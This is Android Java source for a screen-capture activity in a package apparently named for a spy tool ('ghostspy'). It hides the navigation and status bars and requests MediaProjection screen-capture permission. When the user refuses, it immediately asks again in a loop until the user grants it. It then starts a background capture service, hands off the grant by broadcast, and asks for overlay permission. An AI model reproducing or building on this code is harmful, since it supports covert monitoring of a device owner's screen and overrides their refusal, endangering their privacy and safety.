package com.spy.ghostspy.activity;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.spy.ghostspy.R;
import com.spy.ghostspy.services.ScreenCaptureForegroundService;
import com.spy.ghostspy.utils.Common;

public class CaptureActivity extends Activity {
    private static final int MediaProjection_REQUEST_CODE = 1000;
    private MediaProjectionManager mProjectionManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        |View.DRAG_FLAG_GLOBAL_PREFIX_URI_PERMISSION
                        |View.DRAG_FLAG_GLOBAL_PERSISTABLE_URI_PERMISSION
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        setPermission();
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if(hasFocus) {
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        }
    }

    private void setPermission() {
        Common.getInstance().setMediaProjection(true);
        mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mProjectionManager.createScreenCaptureIntent(), MediaProjection_REQUEST_CODE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode == MediaProjection_REQUEST_CODE && resultCode == RESULT_OK) {
            ContextCompat.startForegroundService(this, new Intent(this, ScreenCaptureForegroundService.class));
            Intent intent = new Intent("MEDIA_PROJECTION_RESULT");
            intent.putExtra("resultCode", resultCode);
            intent.putExtra("data", data);
            sendBroadcast(intent);
            requestOverlayPermission();
            finish();
        } else {
            setPermission();
        }
    }
    private void requestOverlayPermission() {
        if(!Settings.canDrawOverlays(getBaseContext())) {
            Intent intent = new Intent(this, OverlaySetActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }
}